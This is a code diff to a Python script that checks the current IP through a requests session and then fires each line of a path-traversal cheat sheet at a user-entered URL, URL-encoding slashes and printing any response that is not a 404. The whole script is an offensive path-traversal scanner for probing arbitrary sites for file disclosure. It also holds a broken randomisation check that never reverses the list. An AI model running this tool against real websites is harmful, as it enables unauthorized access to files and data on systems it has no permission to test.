@@ -1,5 +1,7 @@
 import requests
 import time
+import random
+import re
 
 #setting up an empty session
 session = requests.session()
@@ -7,12 +9,9 @@ session.proxies = {}
 
 #way to access DO NOT USE requests use session like this:
 #r = session.get('https://jasonrigden.com')
-
+#url="https://dnsleaktest.com"
 #leak test
 #it works, trust me
-#r = session.get("https://dnsleaktest.com/")
-#print("Leak test:\n",r.text)
-
 
 #check current IP
 r = session.get("http://httpbin.org/ip")
@@ -65,16 +64,36 @@ print("ALL SETTED UP FOR YOU :)\n\n")
 url_input = input("Enter URL:\t")
 
 with open ("pathtraversal_cheatsheet") as f:
-    cheet_sheet = f.readlines()
+    cheat_sheet = f.readlines()
 
-for cheet in cheet_sheet:
-    url=url_input+cheet
-    print("Trying with:\t", url, "\n")
-    r = session.get(url)
-    print("--------------------------OUTPUT:\n", r.text)
-    exit = input("Continue?\t")
-    if (exit!="Y" and exit!="Yes" and exit!="yes" and exit!="y"):
-        print("The end!\n")
+n = random.random()
+if n%2 == 0:
+    cheat_sheet.reverse()
+
+i = 0
+for cheat in cheat_sheet:
+    try:
+        url = url_input + cheat.replace("/", "%2F")
+        print("Trying with:\t", url, "\n")
+        r = session.get(url)
+        if not re.search("404", r.text):
+            print("--------------------------OUTPUT ", i, ":\n", r.text)
+            exit = input("Continue?\t")
+            if (exit != "Y" and exit != "Yes" and exit != "yes" and exit != "y"):
+                print("The end!\n")
+                break
+            time.sleep(0.5)
+        else:
+            print("--------------------------OUTPUT", i, ":\t404 ERROR")
+        i+=1
+    except requests.exceptions.HTTPError as notfound:
+        print("void page: 404")
+        break
+    except requests.exceptions.MissingSchema as missingschema:
+        print("error url: missing schema")
+        break
+    except requests.exceptions.ConnectionError as nohost:
+        print("host error: host doesn't exist")
         break
 
 print("BYE")
